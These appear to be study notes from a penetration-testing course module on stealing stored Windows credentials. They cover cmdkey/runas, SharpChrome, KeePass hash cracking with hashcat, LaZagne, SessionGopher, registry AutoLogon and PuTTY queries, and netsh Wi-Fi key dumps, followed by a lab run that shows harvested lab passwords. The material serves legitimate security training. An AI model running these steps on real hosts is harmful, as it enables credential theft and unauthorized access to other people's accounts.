# Further Credential Theft

## Cmdkey Saved Credentials

### Listing Saved Credentials

```
cmdkey /list

    Target: LegacyGeneric:target=TERMSRV/SQL01
    Type: Generic
    User: inlanefreight\bob
```

### Run Commands as Another User

```
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

## Browser Credentials

### Retrieving Saved Credentials from Chrome

https://github.com/GhostPack/SharpDPAPI

```
.\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.7.0


[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user



[*] AES state key file : C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : 5A2BF178278C85E70F63C4CC6593C24D61C9E2D38683146F6201B32D5B767CA0


--- Chrome Credential (Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc01.inlanefreight.local/,https://vc01.inlanefreight.local/ui,4/12/2021 5:16:52 PM,13262735812597100,bob@inlanefreight.local,Welcome1
```

## Password Managers

### Extracting KeePass Hash

```
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154
```

### Cracking Hash Offline

hashcat -m 13400 keepass_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*2e8b53e1b11a2af306eb8ac424110c63029e03745d3465cf2e03086bc6f483d0*7df525a2b843990840b249324d55b6ce*75e830162befb17324d6be83853dbeb309ee38475e9fb42c1f809176e9bdf8b8*63fdb1c4fb1dac9cb404bd15b0259c19ec71a8b32f91b2aaaaf032740a39c154:panther1

## Email

https://github.com/dafthack/MailSniper

## More Fun with Credentials

https://github.com/AlessandroZ/LaZagne

### Running All LaZagne Modules

```
.\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

```

## Even More Fun with Credentials

https://github.com/Arvanaghi/SessionGopher

Permit to extract PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials.

It searches the HKEY_USERS hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find.

### Running SessionGopher as Current User

```
Import-Module .\SessionGopher.ps1

Invoke-SessionGopher -Target WINLPE-SRV01
 
          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com
 
[+] Digging on WINLPE-SRV01...
WinSCP Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :
 
 
PuTTY Sessions
 
 
Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local
 

 
SuperPuTTY Sessions
 
 
Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
SessionName   : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
ExtraArgs     :
Port          : 22
Putty Session : Default Settings
```

## Clear-Text Password Storage in the Registry

### Windows AutoLogon

https://learn.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon

**Enumerating Autologon with reg.exe**

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    
    <SNIP>
    
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    htb-student
    DefaultPassword    REG_SZ    HTB_@cademy_stdnt!
```

### Putty

For Putty sessions utilizing a proxy connection, when the session is saved, the credentials are stored in the registry in clear text.

**Enumerating Sessions and Finding Credentials:**

```
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

```
 reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh

HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!  
```

### Wifi Passwords

**Viewing Saved Wireless Networks**

```
netsh wlan show profile

Profiles on interface Wi-Fi:

Group policy profiles (read only)
---------------------------------
    <None>

User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : Bob's iPhone
    All User Profile     : EE_Guest
    All User Profile     : EE_Guest 2.4
    All User Profile     : ilfreight_corp
```

**Retrieving Saved Wireless Passwords**

```
netsh wlan show profile ilfreight_corp key=clear

Profile ilfreight_corp on interface Wi-Fi:
=======================================================================

Applied: All User Profile

Profile information
-------------------
    Version                : 1
    Type                   : Wireless LAN
    Name                   : ilfreight_corp
    Control options        :
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings
---------------------
    Number of SSIDs        : 1
    SSID name              : "ilfreight_corp"
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!

Cost settings
-------------
    Cost                   : Unrestricted
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Default
```

## LAB

xfreerdp /v:10.129.43.43 /u:jordan /p:HTB_@cademy_j0rdan!

C:\Users\jordan>cmdkey /list

Currently stored credentials:

* NONE *

PS C:\Tools> .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.11.1


[*] Action: Chrome Saved Logins Triage


[*] Triaging Chrome Logins for current user


[*] AES state key file : C:\Users\jordan\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : A2B540BBAEFEC5502FA48ABCF11B60D6FC1BA5186EBCB5ED8B6599972D685B48


C:\Users>where /R C:\ *.kdbx
INFO: Could not find files for the given pattern(s).


PS C:\Tools> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: jordan ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Dbvis passwords -----------------

[+] Password found !!!
Name: SQL01.inlanefreight.local
Driver:
          SQL Server (Microsoft JDBC Driver)

Host: localhost
Login: sa
Password: S3cret_db_p@ssw0rd!
Port: 1433


[+] 2 passwords have been found.
For more information launch it again with the -v option

xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt!

C:\Users\htb-student>cmdkey /list

Currently stored credentials:

    Target: Domain:target=WEB01
    Type: Domain Password
    User: amanda

PS C:\Tools> .\SharpChrome.exe logins /unprotect

  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \_ | | | (_) | | | (/_
                |
  v1.11.1


[*] Action: Chrome Saved Logins Triage


[*] Triaging Chrome Logins for current user


[*] AES state key file : C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : D72790F4972C4D5700D8D2ED50D21850A3429373534ED938EB009219A51A0479

[X] Error : 0

---  Credential (Path: C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc.inlanefreight.local/,https://vc
.inlanefreight.local/ui/login,5/26/2021 12:09:51 PM,13266529791618996,root,"?U?1`?l}?????A
?"
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,http://vc01.inlanefreight.local:443/,http:
//vc01.inlanefreight.local:443/login.html,8/7/2021 6:33:01 PM,13272859981246714,root,ILVCadm1n1qazZAQ!


SharpChrome completed in 00:00:00.7327533

PS C:\Tools> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: htb-student ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: ftp.ilfreight.local
Login: root
Password: Ftpuser!
Port: 22

------------------- Vault passwords -----------------

[-] Password not found !!!
URL: Domain:target=WEB01
Login: amanda